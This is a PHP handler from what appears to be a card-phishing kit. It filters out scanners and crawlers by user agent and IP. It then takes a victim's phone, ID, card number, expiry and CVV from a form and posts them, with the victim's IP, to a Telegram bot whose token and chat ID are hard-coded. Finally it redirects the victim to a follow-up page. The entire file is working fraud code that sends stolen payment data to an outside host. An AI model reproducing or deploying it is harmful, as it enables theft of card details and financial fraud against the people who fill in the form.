<?php
include('prevents/anti5.php');
include('prevents/anti1.php');
include('prevents/anti8.php');
include('prevents/anti2.php');
include('prevents/anti4.php');
include('prevents/anti7.php');
include('prevents/anti3.php');

// Anti-Bot Protection
function blockSuspiciousUserAgent()
{
    $botAgents = [
        'curl',
        'wget',
        'bot',
        'crawler',
        'spider',
        'http',
        'python',
        'java'
    ];
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    foreach ($botAgents as $bot) {
        if (strpos($userAgent, $bot) !== false) {
            header("HTTP/1.1 403 Forbidden");
            exit('Access denied');
        }
    }
}

function blockSuspiciousIPs()
{
    $blockedIPs = [
        '192.168.1.1', // Replace with actual IPs to block
        '123.456.789.0',
    ];
    if (in_array($_SERVER['REMOTE_ADDR'], $blockedIPs)) {
        header("HTTP/1.1 403 Forbidden");
        exit('Access denied');
    }
}

// Call protection functions
blockSuspiciousUserAgent();
blockSuspiciousIPs();
// Telegram Bot Configuration
$botToken = "7274962782:AAGi2HZlpm4EGxeoPWrLURWIApxrQls08yw";
$chatId = "-4770377680";

// Collect Form Data
$phone = $_POST['phone'];
$id = $_POST['id'];
$card_name = $_POST['card_name'];
$card_number = $_POST['card_number'];
$month = $_POST['month'];
$year = $_POST['year'];
$cvv = $_POST['cvv'];

// Get User's IP Address
$ip_address = $_SERVER['REMOTE_ADDR'];

// Format the Message
$message = "🦎 *By @thewinper* 🦎\n\n";
$message .= "📱 *Phone:* $phone\n";
$message .= "🆔 *ID:* $id\n";
$message .= "👤 *Cardholder Name:* $card_name\n";
$message .= "💳 *Card Number:* $card_number\n";
$message .= "📅 *Expiry Date:* $month/$year\n";
$message .= "🔒 *CVV:* $cvv\n";
$message .= "🌐 *IP Address:* $ip_address\n";

// Send Message to Telegram
$telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown',
];

$options = [
    'http' => [
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    ],
];

$context  = stream_context_create($options);
$response = file_get_contents($telegramUrl, false, $context);

// Redirect or Display Confirmation
if ($response) {
    header("Location: treatment.php "); // Redirect to Thank You Page
} else {
    echo "Error: Unable to send message to Telegram.";
}